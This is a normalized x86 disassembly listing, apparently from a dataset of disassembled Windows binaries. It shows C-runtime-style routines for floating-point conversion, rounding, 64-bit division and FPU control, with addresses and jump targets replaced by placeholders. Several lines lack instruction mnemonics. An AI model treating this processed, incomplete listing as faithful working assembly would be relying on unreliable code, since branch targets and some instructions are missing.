mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_100238fd
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10023ecf
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_1002417b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023a6c
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023fc6
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023b5c
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024081
jmp r-xdata
sub_10024203
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002417b
add esp 0x1c
pop ebp
retn
sub_10024226
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1002474f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
sub_10024251
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_1002428f
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_10024251
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_100242c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_100242ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100137b8
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10025243
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100247bb
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
sub_10024395
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100137b8
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10025243
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10024cff
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
sub_1002443d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_10010990
inc eax
push eax
push edi
push esi
call sub_10017580
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_100244fc
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_100245b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100244fc
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1002593b
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_100178e5
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
sub_10024650
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10024730
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1002474f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_1002638d
call sub_1002638d
mov [ esi ] eax
jmp r-xdata
call sub_100167f3
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_10010b6c
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_1002638d
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_100247bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10024cff
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
